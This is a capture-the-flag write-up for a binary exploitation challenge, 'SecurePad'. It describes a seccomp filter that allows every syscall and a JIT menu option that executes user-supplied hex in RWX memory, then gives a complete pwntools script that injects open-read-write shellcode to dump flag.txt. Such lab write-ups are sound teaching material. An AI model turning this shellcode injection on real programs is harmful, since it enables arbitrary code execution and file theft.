# CTF Writeup: SecurePad

## Challenge Overview
**Challenge:** SecurePad
**Category:** Pwn / Binary Exploitation
**Vulnerability:** Insecure JIT (RWX Memory) + Broken Seccomp Sandbox

## 1. Reconnaissance
We start by analyzing the binary `securepad`. It is a 64-bit statically linked ELF.

### The Sandbox
The binary includes a function explicitly named `sandbox`. Static analysis of the `prctl` calls reveals the configuration:
* It installs a Seccomp BPF filter.
* The filter consists of a single instruction: `SECCOMP_RET_ALLOW` (`0x7fff0000`).
* **Result:** The sandbox is non-functional and allows all syscalls.

### The Menu
The application provides a menu with an option:
> `2. Run JIT filter`

This prompts the user for "Input JIT code (hex)".

## 2. Vulnerability Analysis
Analyzing the function `jf` (called by the menu) reveals the critical flaw:
1.  **RWX Allocation:** It allocates memory using `mmap` with protection flags `0x7` (`PROT_READ | PROT_WRITE | PROT_EXEC`).
2.  **Execution:** It copies user input into this buffer and executes it via `call *%rdx`.

This allows us to execute arbitrary shellcode.

## 3. Exploitation
While the sandbox theoretically allows `execve`, attempting to spawn `/bin/sh` often causes the process to crash (EOF) in this specific environment. A more robust technique is **Open-Read-Write (ORW)**.

Instead of spawning a shell, we inject shellcode that:
1.  **Opens** the flag file (`flag.txt`).
2.  **Reads** the content into memory.
3.  **Writes** the content to standard output (stdout).

### Exploit Script (ORW)
```python
from pwn import *
import binascii

# Context
context.arch = 'amd64'
context.binary = './securepad'

# Start
# p = remote('IP', PORT)
p = process('./securepad')

# 1. Select JIT Option
p.sendlineafter(b'Exit\n', b'2')

# 2. Craft Payload: Open-Read-Write (ORW)
# This bypasses restrictions on execve by reading the file directly.

# Step A: open('flag.txt', 0)
orw  = shellcraft.open('flag.txt')

# Step B: read(rax, rsp, 100) 
# 'rax' holds the file descriptor returned by open. 
# We read 100 bytes onto the stack ('rsp').
orw += shellcraft.read('rax', 'rsp', 100)

# Step C: write(1, rsp, 100)
# We write 100 bytes from the stack to stdout (fd 1).
orw += shellcraft.write(1, 'rsp', 100)

shellcode = asm(orw)
payload = binascii.hexlify(shellcode)

# 3. Send Payload
p.sendlineafter(b'hex): ', payload)

# 4. Receive Flag
print(p.recvall())
